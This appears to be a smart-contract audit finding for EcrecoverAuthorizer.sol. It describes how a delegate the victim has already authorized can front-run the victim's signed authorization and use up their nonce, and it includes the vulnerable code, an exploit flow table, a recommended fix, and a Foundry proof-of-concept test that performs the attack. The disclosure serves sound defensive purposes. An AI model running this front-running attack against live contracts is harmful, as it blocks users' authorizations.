### Title
EcrecoverAuthorizer Nonce Front-Running by Authorized Delegate Blocks Victim's Pending Authorization - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` permits any address that is already authorized by the victim in Midnight to craft a fresh `Authorization` struct with the victim's current nonce, sign it with their own key, and submit it ahead of the victim's pending transaction. Because the nonce is consumed on success, the victim's in-flight transaction reverts with `InvalidNonce`. The attack is repeatable for every new signature the victim produces, creating a sustained DoS of the EcrecoverAuthorizer flow.

### Finding Description
**Code path — `src/periphery/EcrecoverAuthorizer.sol` lines 24–48:**

```solidity
function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
    require(block.timestamp <= authorization.deadline, Expired());
    require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce()); // (1)

    bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
    bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
    bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
    address signer = ecrecover(digest, signature.v, signature.r, signature.s);
    require(signer != address(0), InvalidSignature());
    require(
        signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer), // (2)
        Unauthorized()
    );
    ...
}
```

**Root cause:** The signer check at (2) accepts *any* address that `Midnight.isAuthorized(authorizer, signer)` returns `true` for. This means an attacker who is already authorized by the victim in Midnight can construct an entirely different `Authorization` struct (different `authorized`, different `isAuthorized`) using the victim's current nonce, sign it with their own key, and submit it. The nonce increment at (1) is committed on success, permanently invalidating the victim's signed message.

**Exploit flow:**

| Step | Actor | Action | State after |
|------|-------|--------|-------------|
| 0 | Victim | `midnight.setIsAuthorized(attacker, true, victim)` (prior, legitimate) | `isAuthorized[victim][attacker] = true` |
| 1 | Victim | Signs `Authorization{authorizer=victim, authorized=operatorX, isAuthorized=true, nonce=N}`, broadcasts tx | Pending in mempool |
| 2 | Attacker | Observes mempool; constructs `Authorization{authorizer=victim, authorized=attacker, isAuthorized=true, nonce=N}`, signs with attacker's own key | — |
| 3 | Attacker | Calls `ecrecoverAuthorizer.setIsAuthorized(attackerAuth, attackerSig)` with higher gas | `nonce[victim] = N+1`; attacker's chosen auth set |
| 4 | Victim's tx | Lands: `nonce[victim]=N+1 != N` → reverts `InvalidNonce` | Victim's intended authorization never set |

Check (2) passes at step 3 because `IMidnight(MIDNIGHT).isAuthorized(victim, attacker)` is `true`. The attacker can repeat this for every new nonce the victim signs. [1](#0-0) [2](#0-1) 

### Impact Explanation
The victim's EcrecoverAuthorizer-based authorization flow is blocked for as long as the attacker remains authorized by the victim in Midnight. Every signed message the victim produces can be front-run and its nonce consumed. The victim cannot use `EcrecoverAuthorizer` to authorize their intended operator. Additionally, the attacker can set the victim's authorization state to an arbitrary value (e.g., authorize themselves for additional roles) via the same mechanism — though this is also achievable via a direct `Midnight.setIsAuthorized` call given the precondition. [3](#0-2) 

### Likelihood Explanation
**Preconditions:**
- The victim must have previously called `midnight.setIsAuthorized(attacker, true, victim)`. This is a normal protocol operation (authorizing an operator, bot, or contract).
- The attacker must observe the victim's pending `EcrecoverAuthorizer.setIsAuthorized` transaction in the mempool.

Both conditions are realistic on any public EVM chain with a visible mempool. The attack is repeatable: every time the victim signs a new message with nonce=N+1, the attacker can front-run again. The victim's only escape is to revoke the attacker's Midnight authorization via a direct `midnight.setIsAuthorized(attacker, false, victim)` call (which does not go through `EcrecoverAuthorizer` and cannot be front-run in the same way). [4](#0-3) 

### Recommendation
Verify the signature **before** accepting the nonce, and restrict who may submit on behalf of the authorizer. Concretely, require that the recovered signer is exactly `authorization.authorizer` (i.e., only the authorizer themselves may sign an `EcrecoverAuthorizer` message). Delegated submission (anyone can relay) is already supported by making the function permissionless to call — the signature itself is the proof of intent. Removing the `isAuthorized` branch from the signer check eliminates the attack surface entirely:

```solidity
require(signer == authorization.authorizer, Unauthorized());
```

If delegated signing is intentionally desired, move the nonce increment to after all checks, and add a `submitter` field to the `Authorization` struct so the victim can restrict who may relay their signed message. [5](#0-4) 

### Proof of Concept
```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {EcrecoverAuthorizerTest} from "./SetIsAuthorizedWithSigTest.sol";
import {Authorization, Signature} from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";
import {IEcrecoverAuthorizer} from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract FrontRunNonceTest is EcrecoverAuthorizerTest {
    function testFrontRunNonceBlocking() public {
        // Setup: victim (borrower) authorizes attacker in Midnight
        vm.prank(borrower);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);
        vm.prank(borrower);
        midnight.setIsAuthorized(lender /* attacker */, true, borrower);

        // Victim signs Authorization{authorizer=borrower, authorized=otherLender, isAuthorized=true, nonce=0}
        Authorization memory victimAuth = makeAuthorization(borrower, otherLender, true);
        Signature memory victimSig = signAuthorization(victimAuth, borrower);

        // Attacker (lender) front-runs with a different Authorization using the same nonce=0,
        // signed with attacker's own key — passes because isAuthorized(borrower, lender)==true
        Authorization memory attackerAuth = Authorization({
            authorizer: borrower,
            authorized: lender,       // attacker authorizes themselves
            isAuthorized: true,
            nonce: 0,                 // same nonce as victim's pending tx
            deadline: block.timestamp + 1 days
        });
        Signature memory attackerSig = signAuthorization(attackerAuth, lender);

        vm.prank(lender); // attacker submits first
        ecrecoverAuthorizer.setIsAuthorized(attackerAuth, attackerSig);

        // Assert: nonce consumed, attacker's auth set
        assertEq(ecrecoverAuthorizer.nonce(borrower), 1);
        assertEq(midnight.isAuthorized(borrower, lender), true);

        // Victim's tx now reverts
        vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
        ecrecoverAuthorizer.setIsAuthorized(victimAuth, victimSig);

        // Victim's intended authorization was never set
        assertEq(midnight.isAuthorized(borrower, otherLender), false);
    }
}
```

**Expected assertions:**
- `ecrecoverAuthorizer.nonce(borrower) == 1` after attacker's tx
- `midnight.isAuthorized(borrower, otherLender) == false` (victim's intent blocked)
- Victim's `setIsAuthorized` call reverts with `InvalidNonce` [6](#0-5) [7](#0-6)
